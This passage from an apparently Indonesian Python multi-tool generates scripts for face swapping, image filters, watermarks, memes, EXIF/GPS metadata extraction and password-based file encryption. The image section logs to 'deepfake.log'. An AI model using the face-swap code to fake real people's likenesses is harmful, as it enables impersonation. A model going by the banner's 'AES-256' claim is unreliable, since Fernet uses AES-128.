    source_path = input("Source image (face to copy): ").strip()
    target_path = input("Target image (face to replace): ").strip()
    
    # Load images
    source = load_image(source_path)
    target = load_image(target_path)
    
    if source is None or target is None:
        return
    
    # Detect faces
    source_faces = detect_faces(source)
    target_faces = detect_faces(target)
    
    if len(source_faces) == 0 or len(target_faces) == 0:
        return
    
    # Use first face from each
    source_face = source_faces[0]
    target_face = target_faces[0]
    
    print("Processing face swap...")
    result = face_swap(source, target, source_face, target_face)
    
    if result is not None:
        # Save result
        output_path = "face_swap_result.jpg"
        cv2.imwrite(output_path, result)
        print(f"Result saved to: {output_path}")
        
        # Show result
        cv2.imshow("Face Swap Result", result)
        cv2.waitKey(0)
        cv2.destroyAllWindows()
    else:
        print("Face swap failed!")

if __name__ == "__main__":
    main()
'''
        
        filename = "face_swap_tool.py"
        with open(filename, "w") as f:
            f.write(faceswap_script)
        
        print(colored(f"\n[Face Swap Tool Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Requires additional files:", 'yellow'))
        print(colored("     1. shape_predictor_68_face_landmarks.dat", 'white'))
        print(colored("        Download: http://dlib.net/files/shape_predictor_68_face_landmarks.dat.bz2", 'white'))
        print(colored("     2. Install: pip install opencv-python dlib numpy", 'white'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    
    elif choice == "2":
        print(colored("\n[Image Filter Tool]", 'yellow'))
        
        filter_script = '''#!/usr/bin/env python3
from PIL import Image, ImageFilter, ImageEnhance, ImageOps
import os, sys, random

print("[Image Filter & Effects Tool]")

def apply_filters(image_path):
    """Apply various filters to an image"""
    if not os.path.exists(image_path):
        print(f"Error: Image not found: {image_path}")
        return
    
    # Open image
    try:
        img = Image.open(image_path)
        print(f"Original image: {img.size[0]}x{img.size[1]}, {img.mode}")
    except:
        print(f"Error: Could not open image: {image_path}")
        return
    
    # Create output directory
    os.makedirs("filter_results", exist_ok=True)
    
    base_name = os.path.splitext(os.path.basename(image_path))[0]
    
    # 1. Grayscale
    gray = img.convert('L')
    gray.save(f"filter_results/{base_name}_grayscale.jpg")
    print(f"   • Grayscale saved")
    
    # 2. Blur
    blur = img.filter(ImageFilter.GaussianBlur(radius=3))
    blur.save(f"filter_results/{base_name}_blur.jpg")
    print(f"   • Blur saved")
    
    # 3. Sharpen
    sharpen = img.filter(ImageFilter.SHARPEN)
    sharpen.save(f"filter_results/{base_name}_sharpen.jpg")
    print(f"   • Sharpen saved")
    
    # 4. Edge Enhance
    edge_enhance = img.filter(ImageFilter.EDGE_ENHANCE)
    edge_enhance.save(f"filter_results/{base_name}_edge_enhance.jpg")
    print(f"   • Edge enhance saved")
    
    # 5. Find Edges
    edges = img.filter(ImageFilter.FIND_EDGES)
    edges.save(f"filter_results/{base_name}_edges.jpg")
    print(f"   • Edges saved")
    
    # 6. Emboss
    emboss = img.filter(ImageFilter.EMBOSS)
    emboss.save(f"filter_results/{base_name}_emboss.jpg")
    print(f"   • Emboss saved")
    
    # 7. Contour
    contour = img.filter(ImageFilter.CONTOUR)
    contour.save(f"filter_results/{base_name}_contour.jpg")
    print(f"   • Contour saved")
    
    # 8. Brightness
    enhancer = ImageEnhance.Brightness(img)
    bright = enhancer.enhance(1.5)
    bright.save(f"filter_results/{base_name}_bright.jpg")
    print(f"   • Brightness saved")
    
    # 9. Contrast
    enhancer = ImageEnhance.Contrast(img)
    contrast = enhancer.enhance(1.5)
    contrast.save(f"filter_results/{base_name}_contrast.jpg")
    print(f"   • Contrast saved")
    
    # 10. Color
    enhancer = ImageEnhance.Color(img)
    colorful = enhancer.enhance(1.5)
    colorful.save(f"filter_results/{base_name}_colorful.jpg")
    print(f"   • Color enhanced saved")
    
    # 11. Invert
    invert = ImageOps.invert(img.convert('RGB'))
    invert.save(f"filter_results/{base_name}_invert.jpg")
    print(f"   • Invert saved")
    
    # 12. Mirror
    mirror = ImageOps.mirror(img)
    mirror.save(f"filter_results/{base_name}_mirror.jpg")
    print(f"   • Mirror saved")
    
    # 13. Flip
    flip = ImageOps.flip(img)
    flip.save(f"filter_results/{base_name}_flip.jpg")
    print(f"   • Flip saved")
    
    # 14. Sepia
    sepia = apply_sepia(img)
    sepia.save(f"filter_results/{base_name}_sepia.jpg")
    print(f"   • Sepia saved")
    
    # 15. Vintage
    vintage = apply_vintage(img)
    vintage.save(f"filter_results/{base_name}_vintage.jpg")
    print(f"   • Vintage saved")
    
    print(f"\nAll filters saved to 'filter_results' folder!")

def apply_sepia(img):
    """Apply sepia filter"""
    width, height = img.size
    pixels = img.load()
    
    for py in range(height):
        for px in range(width):
            r, g, b = img.getpixel((px, py))
            
            # Sepia formula
            tr = int(0.393 * r + 0.769 * g + 0.189 * b)
            tg = int(0.349 * r + 0.686 * g + 0.168 * b)
            tb = int(0.272 * r + 0.534 * g + 0.131 * b)
            
            # Clamp values
            tr = min(255, tr)
            tg = min(255, tg)
            tb = min(255, tb)
            
            pixels[px, py] = (tr, tg, tb)
    
    return img

def apply_vintage(img):
    """Apply vintage filter"""
    # Convert to RGB if not already
    if img.mode != 'RGB':
        img = img.convert('RGB')
    
    # Apply sepia
    vintage_img = apply_sepia(img.copy())
    
    # Add vignette effect
    width, height = vintage_img.size
    pixels = vintage_img.load()
    
    for py in range(height):
        for px in range(width):
            # Calculate distance from center
            dx = px - width/2
            dy = py - height/2
            distance = (dx*dx + dy*dy) ** 0.5
            max_distance = ((width/2)**2 + (height/2)**2) ** 0.5
            
            # Darken edges
            darkness = 0.7 * (distance / max_distance)
            r, g, b = vintage_img.getpixel((px, py))
            
            r = int(r * (1 - darkness))
            g = int(g * (1 - darkness))
            b = int(b * (1 - darkness))
            
            pixels[px, py] = (r, g, b)
    
    # Add noise
    vintage_img = vintage_img.filter(ImageFilter.GaussianBlur(0.5))
    
    return vintage_img

def main():
    print("\nImage Filter Application")
    print("=" * 50)
    
    image_path = input("Enter image path: ").strip()
    
    if not image_path:
        print("No image path provided!")
        return
    
    apply_filters(image_path)
    
    print("\nDone! Check 'filter_results' folder for all filtered images.")

if __name__ == "__main__":
    main()
'''
        
        filename = "image_filter_tool.py"
        with open(filename, "w") as f:
            f.write(filter_script)
        
        print(colored(f"\n[Image Filter Tool Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Applies 15+ filters to any image", 'white'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
        print(colored("   Enter image path when prompted", 'white'))
    
    elif choice == "3":
        print(colored("\n[Watermark Tool]", 'yellow'))
        
        watermark_script = '''#!/usr/bin/env python3
from PIL import Image, ImageDraw, ImageFont
import os, sys

print("[Text Watermark Tool]")

def add_watermark(image_path, text="WATERMARK", position="center", opacity=0.5):
    """Add text watermark to image"""
    if not os.path.exists(image_path):
        print(f"Error: Image not found: {image_path}")
        return False
    
    try:
        # Open image
        img = Image.open(image_path).convert("RGBA")
        width, height = img.size
        
        # Create watermark layer
        watermark = Image.new("RGBA", img.size, (255, 255, 255, 0))
        draw = ImageDraw.Draw(watermark)
        
        # Try to load font
        try:
            font_size = min(width, height) // 20
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            # Use default font if arial not available
            font = ImageFont.load_default()
        
        # Calculate text size
        try:
            text_bbox = draw.textbbox((0, 0), text, font=font)
            text_width = text_bbox[2] - text_bbox[0]
            text_height = text_bbox[3] - text_bbox[1]
        except:
            text_width = len(text) * font_size
            text_height = font_size
        
        # Calculate position
        if position == "center":
            x = (width - text_width) // 2
            y = (height - text_height) // 2
        elif position == "top-left":
            x = 10
            y = 10
        elif position == "top-right":
            x = width - text_width - 10
            y = 10
        elif position == "bottom-left":
            x = 10
            y = height - text_height - 10
        elif position == "bottom-right":
            x = width - text_width - 10
            y = height - text_height - 10
        elif position == "tiled":
            # Tiled watermark
            result = img.copy()
            draw_result = ImageDraw.Draw(result)
            
            spacing_x = text_width + 50
            spacing_y = text_height + 50
            
            for i in range(0, width, spacing_x):
                for j in range(0, height, spacing_y):
                    # Semi-transparent
                    draw_result.text((i, j), text, font=font, 
                                   fill=(255, 255, 255, int(255 * opacity)))
            
            # Save result
            base_name = os.path.splitext(os.path.basename(image_path))[0]
            output_path = f"{base_name}_watermarked.png"
            result.save(output_path)
            print(f"Watermarked image saved: {output_path}")
            return True
        
        else:
            x = 10
            y = height - text_height - 10
        
        # Draw text with opacity
        draw.text((x, y), text, font=font, 
                 fill=(255, 255, 255, int(255 * opacity)))
        
        # Rotate watermark if desired
        if position == "diagonal":
            watermark = watermark.rotate(45, expand=1)
            # Need to recalculate position for rotated watermark
            watermark = Image.new("RGBA", img.size, (255, 255, 255, 0))
            draw = ImageDraw.Draw(watermark)
            
            # Draw diagonal text
            draw.text((50, 50), text, font=font, 
                     fill=(255, 255, 255, int(255 * opacity)))
        
        # Composite images
        result = Image.alpha_composite(img, watermark)
        
        # Convert back to RGB for JPEG
        result = result.convert("RGB")
        
        # Save result
        base_name = os.path.splitext(os.path.basename(image_path))[0]
        output_path = f"{base_name}_watermarked.jpg"
        result.save(output_path, "JPEG", quality=95)
        
        print(f"Watermarked image saved: {output_path}")
        print(f"   Text: '{text}'")
        print(f"   Position: {position}")
        print(f"   Opacity: {opacity * 100}%")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    print("\nText Watermark Tool")
    print("=" * 50)
    
    image_path = input("Image path: ").strip()
    if not image_path:
        print("No image path provided!")
        return
    
    if not os.path.exists(image_path):
        print(f"Image not found: {image_path}")
        return
    
    text = input("Watermark text (default: WATERMARK): ").strip()
    if not text:
        text = "WATERMARK"
    
    print("\nSelect position:")
    print("  1. Center")
    print("  2. Top-left")
    print("  3. Top-right")
    print("  4. Bottom-left")
    print("  5. Bottom-right")
    print("  6. Tiled (repeating)")
    print("  7. Diagonal")
    
    position_choice = input("Choose position [1-7]: ").strip()
    
    positions = {
        "1": "center",
        "2": "top-left",
        "3": "top-right",
        "4": "bottom-left",
        "5": "bottom-right",
        "6": "tiled",
        "7": "diagonal"
    }
    
    position = positions.get(position_choice, "bottom-right")
    
    opacity_input = input("Opacity (0.1-1.0, default 0.5): ").strip()
    try:
        opacity = float(opacity_input)
        if opacity < 0.1:
            opacity = 0.1
        elif opacity > 1.0:
            opacity = 1.0
    except:
        opacity = 0.5
    
    print(f"\nApplying watermark...")
    success = add_watermark(image_path, text, position, opacity)
    
    if success:
        print("\n✓ Watermark applied successfully!")
    else:
        print("\n✗ Failed to apply watermark")

if __name__ == "__main__":
    main()
'''
        
        filename = "watermark_tool.py"
        with open(filename, "w") as f:
            f.write(watermark_script)
        
        print(colored(f"\n[Watermark Tool Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Adds customizable text watermarks", 'white'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    
    elif choice == "4":
        print(colored("\n[Meme Generator]", 'yellow'))
        
        meme_script = '''#!/usr/bin/env python3
from PIL import Image, ImageDraw, ImageFont
import os, sys, textwrap, random

print("[Meme Generator Tool]")

def create_meme(image_path, top_text="", bottom_text=""):
    """Create a meme with top and bottom text"""
    if not os.path.exists(image_path):
        print(f"Error: Image not found: {image_path}")
        return False
    
    try:
        # Open image
        img = Image.open(image_path)
        width, height = img.size
        
        # Convert to RGB if necessary
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        # Prepare to draw
        draw = ImageDraw.Draw(img)
        
        # Load font (try Impact font, common for memes)
        try:
            font_size = min(width, height) // 10
            font = ImageFont.truetype("impact.ttf", font_size)
        except:
            # Try Arial
            try:
                font = ImageFont.truetype("arial.ttf", font_size)
            except:
                # Default font
                font = ImageFont.load_default()
        
        # Function to draw outlined text (meme style)
        def draw_outlined_text(draw_obj, position, text, font, fill_color, outline_color):
            x, y = position
            # Draw outline
            for x_offset in [-2, 0, 2]:
                for y_offset in [-2, 0, 2]:
                    if x_offset == 0 and y_offset == 0:
                        continue
                    draw_obj.text((x + x_offset, y + y_offset), text, 
                                font=font, fill=outline_color)
            # Draw main text
            draw_obj.text(position, text, font=font, fill=fill_color)
        
        # Top text
        if top_text:
            # Wrap text
            avg_char_width = font_size * 0.6
            max_chars = int(width / avg_char_width)
            wrapped_lines = textwrap.wrap(top_text, width=max_chars)
            
            # Calculate total text height
            line_height = font_size * 1.2
            total_text_height = len(wrapped_lines) * line_height
            
            # Draw each line
            y_position = 10
            for line in wrapped_lines:
                # Get text width
                try:
                    text_bbox = draw.textbbox((0, 0), line, font=font)
                    text_width = text_bbox[2] - text_bbox[0]
                except:
                    text_width = len(line) * font_size
                
                # Center text
                x_position = (width - text_width) // 2
                
                # Draw text with outline
                draw_outlined_text(draw, (x_position, y_position), line, font, 
                                 fill_color="white", outline_color="black")
                
                y_position += line_height
        
        # Bottom text
        if bottom_text:
            # Wrap text
            avg_char_width = font_size * 0.6
            max_chars = int(width / avg_char_width)
            wrapped_lines = textwrap.wrap(bottom_text, width=max_chars)
            
            # Calculate total text height
            line_height = font_size * 1.2
            total_text_height = len(wrapped_lines) * line_height
            
            # Draw each line (from bottom up)
            y_position = height - total_text_height - 10
            
            for line in wrapped_lines:
                # Get text width
                try:
                    text_bbox = draw.textbbox((0, 0), line, font=font)
                    text_width = text_bbox[2] - text_bbox[0]
                except:
                    text_width = len(line) * font_size
                
                # Center text
                x_position = (width - text_width) // 2
                
                # Draw text with outline
                draw_outlined_text(draw, (x_position, y_position), line, font,
                                 fill_color="white", outline_color="black")
                
                y_position += line_height
        
        # Save meme
        base_name = os.path.splitext(os.path.basename(image_path))[0]
        output_path = f"{base_name}_meme.jpg"
        img.save(output_path, "JPEG", quality=95)
        
        print(f"\n✓ Meme created: {output_path}")
        if top_text:
            print(f"   Top text: '{top_text}'")
        if bottom_text:
            print(f"   Bottom text: '{bottom_text}'")
        
        return True
        
    except Exception as e:
        print(f"Error creating meme: {e}")
        return False

def meme_templates():
    """Show meme templates"""
    print("\nPopular Meme Templates:")
    print("  1. Distracted Boyfriend")
    print("  2. Drake Hotline Bling")
    print("  3. Change My Mind")
    print("  4. Two Buttons")
    print("  5. Waiting Skeleton")
    print("  6. Left Exit 12 Off Ramp")
    print("  7. Is This A Pigeon")
    print("  8. This Is Fine")
    print("  9. Surprised Pikachu")
    print("  10. Custom Image")

def get_template_image(choice):
    """Get template image based on choice"""
    templates = {
        "1": "https://i.imgflip.com/1ur9b0.jpg",
        "2": "https://i.imgflip.com/30b1gx.jpg",
        "3": "https://i.imgflip.com/24y43o.jpg",
        "4": "https://i.imgflip.com/1g8my4.jpg",
        "5": "https://i.imgflip.com/28j0te.jpg",
        "6": "https://i.imgflip.com/22bdq6.jpg",
        "7": "https://i.imgflip.com/1o00in.jpg",
        "8": "https://i.imgflip.com/46e43q.jpg",
        "9": "https://i.imgflip.com/2kbn1e.jpg"
    }
    
    return templates.get(choice, "")

def main():
    print("\nMEME GENERATOR")
    print("=" * 50)
    
    meme_templates()
    
    choice = input("\nChoose template [1-10]: ").strip()
    
    if choice == "10":
        # Custom image
        image_path = input("\nEnter custom image path: ").strip()
        if not image_path:
            print("Image not found!")
            return
    elif choice in ["1", "2", "3", "4", "5", "6", "7", "8", "9"]:
        # Template image
        template_url = get_template_image(choice)
        if template_url:
            print(f"\nTemplate URL: {template_url}")
            print("Download the image and provide the local path.")
            image_path = input("Local path to template image: ").strip()
            
            if not os.path.exists(image_path):
                print("Please download the image first!")
                return
        else:
            print("Invalid template choice!")
            return
    else:
        print("Invalid choice!")
        return
    
    print("\nEnter meme text (leave blank for none):")
    top_text = input("Top text: ").strip()
    bottom_text = input("Bottom text: ").strip()
    
    if not top_text and not bottom_text:
        print("\nAt least one text field is required!")
        return
    
    print("\nCreating meme...")
    create_meme(image_path, top_text, bottom_text)

if __name__ == "__main__":
    main()
'''
        
        filename = "meme_generator.py"
        with open(filename, "w") as f:
            f.write(meme_script)
        
        print(colored(f"\n[Meme Generator Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Creates internet memes with text", 'white'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    
    elif choice == "5":
        print(colored("\n[Image Metadata Tool]", 'yellow'))
        
        metadata_script = '''#!/usr/bin/env python3
from PIL import Image, ImageOps
from PIL.ExifTags import TAGS, GPSTAGS
import os, sys, json, datetime

print("[Image Metadata Viewer/Editor]")

def get_exif_data(image):
    """Extract EXIF data from image"""
    exif_data = {}
    
    try:
        info = image._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                exif_data[decoded] = value
    except:
        pass
    
    return exif_data

def get_gps_info(exif_data):
    """Extract GPS information from EXIF data"""
    gps_info = {}
    
    if 'GPSInfo' in exif_data:
        for key in exif_data['GPSInfo'].keys():
            decode = GPSTAGS.get(key, key)
            gps_info[decode] = exif_data['GPSInfo'][key]
    
    return gps_info

def convert_to_degrees(value):
    """Convert GPS coordinates to degrees"""
    d = float(value[0][0]) / float(value[0][1])
    m = float(value[1][0]) / float(value[1][1])
    s = float(value[2][0]) / float(value[2][1])
    
    return d + (m / 60.0) + (s / 3600.0)

def view_metadata(image_path):
    """View image metadata"""
    if not os.path.exists(image_path):
        print(f"Error: Image not found: {image_path}")
        return
    
    try:
        image = Image.open(image_path)
        
        print(f"\n[IMAGE INFORMATION]")
        print(f"   Filename: {os.path.basename(image_path)}")
        print(f"   Format: {image.format}")
        print(f"   Size: {image.size[0]} x {image.size[1]} pixels")
        print(f"   Mode: {image.mode}")
        print(f"   File Size: {os.path.getsize(image_path)} bytes")
        
        # EXIF Data
        print(f"\n[EXIF METADATA]")
        exif_data = get_exif_data(image)
        
        if not exif_data:
            print("   No EXIF data found")
        else:
            for key, value in exif_data.items():
                if key == 'GPSInfo':
                    continue
                
                # Format value for display
                if isinstance(value, bytes):
                    try:
                        value = value.decode('utf-8', errors='ignore')
                    except:
                        value = str(value)
                
                print(f"   {key}: {value}")
        
        # GPS Information
        gps_info = get_gps_info(exif_data)
        
        if gps_info:
            print(f"\n[GPS INFORMATION]")
            for key, value in gps_info.items():
                print(f"   {key}: {value}")
            
            # Try to get coordinates
            try:
                lat_data = gps_info.get('GPSLatitude')
                lat_ref = gps_info.get('GPSLatitudeRef', 'N')
                lon_data = gps_info.get('GPSLongitude')
                lon_ref = gps_info.get('GPSLongitudeRef', 'E')
                
                if lat_data and lon_data:
                    lat = convert_to_degrees(lat_data)
                    if lat_ref != 'N':
                        lat = -lat
                    
                    lon = convert_to_degrees(lon_data)
                    if lon_ref != 'E':
                        lon = -lon
                    
                    print(f"\n   Coordinates: {lat:.6f}, {lon:.6f}")
                    print(f"   Google Maps: https://maps.google.com/?q={lat},{lon}")
            except:
                pass
        
        # Save metadata to file
        metadata_file = f"{os.path.splitext(image_path)[0]}_metadata.json"
        metadata = {
            "filename": os.path.basename(image_path),
            "path": image_path,
            "image_info": {
                "format": image.format,
                "size": image.size,
                "mode": image.mode,
                "file_size": os.path.getsize(image_path)
            },
            "exif_data": exif_data,
            "gps_info": gps_info,
            "scan_time": datetime.datetime.now().isoformat()
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2, default=str)
        
        print(f"\n[+] Metadata saved to: {metadata_file}")
        
    except Exception as e:
        print(f"Error: {e}")

def strip_metadata(image_path):
    """Strip metadata from image"""
    if not os.path.exists(image_path):
        print(f"Error: Image not found: {image_path}")
        return False
    
    try:
        # Open image and save without EXIF
        image = Image.open(image_path)
        
        # Create new image without metadata
        data = list(image.getdata())
        stripped = Image.new(image.mode, image.size)
        stripped.putdata(data)
        
        # Save new file
        base_name = os.path.splitext(image_path)[0]
        ext = os.path.splitext(image_path)[1]
        output_path = f"{base_name}_stripped{ext}"
        
        stripped.save(output_path)
        
        print(f"\n[✓] Metadata stripped successfully!")
        print(f"   Original: {image_path}")
        print(f"   Stripped: {output_path}")
        print(f"   Original size: {os.path.getsize(image_path)} bytes")
        print(f"   Stripped size: {os.path.getsize(output_path)} bytes")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    print("\nIMAGE METADATA TOOL")
    print("=" * 50)
    
    print("\nOptions:")
    print("  1. View metadata")
    print("  2. Strip metadata")
    print("  3. Batch process folder")
    
    choice = input("\nChoose option [1-3]: ").strip()
    
    if choice == "1":
        image_path = input("\nImage path: ").strip()
        if not os.path.exists(image_path):
            print("Image not found!")
            return
        
        view_metadata(image_path)
    
    elif choice == "2":
        image_path = input("\nImage path: ").strip()
        if not os.path.exists(image_path):
            print("Image not found!")
            return
        
        confirm = input("This will create a new file without metadata. Continue? (y/n): ").lower()
        if confirm == 'y':
            strip_metadata(image_path)
    
    elif choice == "3":
        folder_path = input("\nFolder path: ").strip()
        if not os.path.exists(folder_path):
            print("Folder not found!")
            return
        
        print("\nBatch options:")
        print("  1. View metadata for all images")
        print("  2. Strip metadata from all images")
        
        batch_choice = input("Choose [1-2]: ").strip()
        
        if batch_choice == "1":
            # View metadata for all images
            image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff']
            image_files = []
            
            for file in os.listdir(folder_path):
                if any(file.lower().endswith(ext) for ext in image_extensions):
                    image_files.append(os.path.join(folder_path, file))
            
            print(f"\nFound {len(image_files)} image(s)")
            
            for image_file in image_files:
                print(f"\n{'='*50}")
                print(f"Processing: {os.path.basename(image_file)}")
                view_metadata(image_file)
        
        elif batch_choice == "2":
            # Strip metadata from all images
            confirm = input("This will create new files for ALL images. Continue? (y/n): ").lower()
            if confirm != 'y':
                return
            
            image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff']
            image_files = []
            
            for file in os.listdir(folder_path):
                if any(file.lower().endswith(ext) for ext in image_extensions):
                    image_files.append(os.path.join(folder_path, file))
            
            print(f"\nProcessing {len(image_files)} image(s)...")
            
            success_count = 0
            for image_file in image_files:
                try:
                    if strip_metadata(image_file):
                        success_count += 1
                except:
                    pass
            
            print(f"\n[+] Batch processing complete!")
            print(f"   Successfully processed: {success_count}/{len(image_files)} images")
    
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    main()
'''
        
        filename = "metadata_tool.py"
        with open(filename, "w") as f:
            f.write(metadata_script)
        
        print(colored(f"\n[Metadata Tool Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   View and edit image metadata (EXIF)", 'white'))
        print(colored(f"   Can strip GPS/location data", 'yellow'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    
    else:
        print(colored("[ERROR] Invalid choice!", 'red'))
        input("\nEnter...")
        return
    
    save_result("deepfake.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 7: ENCRYPT LOCAL ==================
def fitur_7():  
    os.system('clear'); print(colored("\n[7] ENCRYPT & DECRYPT FILES", 'cyan', attrs=['bold']))
    if not CRYPTO_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: cryptography", 'yellow'))
        print(colored("   Install: pip install cryptography", 'white'))
        input("\nEnter...")
        return
    
    print(colored("   [LOCAL MODE - File Encryption Tool]", 'yellow'))
    
    encrypt_script = '''#!/usr/bin/env python3
import os, sys, hashlib, base64, getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

print("[FILE ENCRYPTION TOOL]")

def generate_key(password, salt=None):
    """Generate encryption key from password"""
    if salt is None:
        salt = os.urandom(16)
    
    # Use PBKDF2 to derive key from password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key, salt

def encrypt_file(file_path, password):
    """Encrypt a file with password"""
    if not os.path.exists(file_path):
        print(f"Error: File not found: {file_path}")
        return False
    
    try:
        # Read file
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Generate key from password
        key, salt = generate_key(password)
        
        # Encrypt data
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        
        # Save encrypted file
        output_path = file_path + '.encrypted'
        with open(output_path, 'wb') as f:
            # Write salt first, then encrypted data
            f.write(salt)
            f.write(encrypted_data)
        
        print(f"\n[✓] File encrypted successfully!")
        print(f"   Original: {file_path}")
        print(f"   Encrypted: {output_path}")
        print(f"   Original size: {len(data)} bytes")
        print(f"   Encrypted size: {len(encrypted_data) + len(salt)} bytes")
        
        # Optional: delete original file
        delete = input("\nDelete original file? (y/n): ").lower()
        if delete == 'y':
            os.remove(file_path)
            print("   Original file deleted")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def decrypt_file(file_path, password):
    """Decrypt a file with password"""
    if not os.path.exists(file_path):
        print(f"Error: File not found: {file_path}")
        return False
    
    if not file_path.endswith('.encrypted'):
        print("Error: File doesn't appear to be encrypted (.encrypted extension)")
        return False
    
    try:
        # Read encrypted file
        with open(file_path, 'rb') as f:
            # First 16 bytes are salt
            salt = f.read(16)
            encrypted_data = f.read()
        
        # Generate key from password
        key, _ = generate_key(password, salt)
        
        # Decrypt data
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)
        
        # Save decrypted file (remove .encrypted extension)
        output_path = file_path.replace('.encrypted', '.decrypted')
        with open(output_path, 'wb') as f:
            f.write(decrypted_data)
        
        print(f"\n[✓] File decrypted successfully!")
        print(f"   Encrypted: {file_path}")
        print(f"   Decrypted: {output_path}")
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        print("   Wrong password or corrupted file!")
        return False

def encrypt_text():
    """Encrypt text string"""
    print("\n[TEXT ENCRYPTION]")
    
    text = input("Enter text to encrypt: ").strip()
    if not text:
        print("No text provided!")
        return
    
    password = getpass.getpass("Enter encryption password: ").strip()
    if not password:
        print("Password required!")
        return
    
    # Generate key
    key, salt = generate_key(password)
    
    # Encrypt
    fernet = Fernet(key)
    encrypted = fernet.encrypt(text.encode())
    
    # Combine salt + encrypted
    combined = salt + encrypted
    
    # Encode for display
    encoded = base64.urlsafe_b64encode(combined).decode()
    
    print(f"\n[ENCRYPTED TEXT]")
    print(f"   {encoded}")
    print(f"\n[INFO]")
    print(f"   Password: {password}")
    print(f"   Save this text for decryption")
    
    # Save to file
    save = input("\nSave to file? (y/n): ").lower()
    if save == 'y':
        filename = input("Filename (default: encrypted.txt): ").strip()
        if not filename:
            filename = "encrypted.txt"
        
        with open(filename, 'w') as f:
            f.write(encoded)
        print(f"Saved to {filename}")

def decrypt_text():
    """Decrypt text string"""
    print("\n[TEXT DECRYPTION]")
    
    encrypted_input = input("Enter encrypted text: ").strip()
    if not encrypted_input:
        print("No text provided!")
        return
    
    password = getpass.getpass("Enter decryption password: ").strip()
    if not password:
        print("Password required!")
        return
    
    try:
        # Decode base64
        combined = base64.urlsafe_b64decode(encrypted_input.encode())
        
        # Extract salt (first 16 bytes) and encrypted data
        salt = combined[:16]
        encrypted_data = combined[16:]
        
        # Generate key
        key, _ = generate_key(password, salt)
        
        # Decrypt
        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted_data).decode()
        
        print(f"\n[DECRYPTED TEXT]")
        print(f"   {decrypted}")
        
    except Exception as e:
        print(f"Error: {e}")
        print("   Wrong password or invalid input!")

def main():
    print("\nENCRYPTION/DECRYPTION TOOL")
    print("=" * 50)
    
    print("\nOptions:")
    print("  1. Encrypt file")
    print("  2. Decrypt file")
    print("  3. Encrypt text")
    print("  4. Decrypt text")
    print("  5. Batch encrypt folder")
    
    choice = input("\nChoose option [1-5]: ").strip()
    
    if choice == "1":
        file_path = input("\nFile path to encrypt: ").strip()
        if not os.path.exists(file_path):
            print("File not found!")
            return
        
        password = getpass.getpass("Enter encryption password: ").strip()
        if not password:
            print("Password required!")
            return
        
        confirm = getpass.getpass("Confirm password: ").strip()
        if password != confirm:
            print("Passwords don't match!")
            return
        
        encrypt_file(file_path, password)
    
    elif choice == "2":
        file_path = input("\nFile path to decrypt (.encrypted): ").strip()
        if not os.path.exists(file_path):
            print("File not found!")
            return
        
        password = getpass.getpass("Enter decryption password: ").strip()
        if not password:
            print("Password required!")
            return
        
        decrypt_file(file_path, password)
    
    elif choice == "3":
        encrypt_text()
    
    elif choice == "4":
        decrypt_text()
    
    elif choice == "5":
        folder_path = input("\nFolder path to encrypt: ").strip()
        if not os.path.exists(folder_path):
            print("Folder not found!")
            return
        
        password = getpass.getpass("Enter encryption password: ").strip()
        if not password:
            print("Password required!")
            return
        
        confirm = getpass.getpass("Confirm password: ").strip()
        if password != confirm:
            print("Passwords don't match!")
            return
        
        # Get all files in folder
        files = []
        for root, dirs, filenames in os.walk(folder_path):
            for filename in filenames:
                # Skip already encrypted files
                if not filename.endswith('.encrypted'):
                    files.append(os.path.join(root, filename))
        
        print(f"\nFound {len(files)} file(s) to encrypt")
        
        if len(files) == 0:
            print("No files found!")
            return
        
        confirm = input("Encrypt ALL files? (y/n): ").lower()
        if confirm != 'y':
            return
        
        success_count = 0
        for file_path in files:
            try:
                print(f"\nProcessing: {os.path.basename(file_path)}")
                if encrypt_file(file_path, password):
                    success_count += 1
            except Exception as e:
                print(f"   Error: {e}")
        
        print(f"\n[+] Batch encryption complete!")
        print(f"   Successfully encrypted: {success_count}/{len(files)} files")
    
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    main()
'''
    
    filename = "encryption_tool.py"
    with open(filename, "w") as f:
        f.write(encrypt_script)
    
    print(colored(f"\n[Encryption Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Encrypt/decrypt files and text", 'white'))
    print(colored(f"   Uses AES-256 encryption", 'yellow'))
    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    
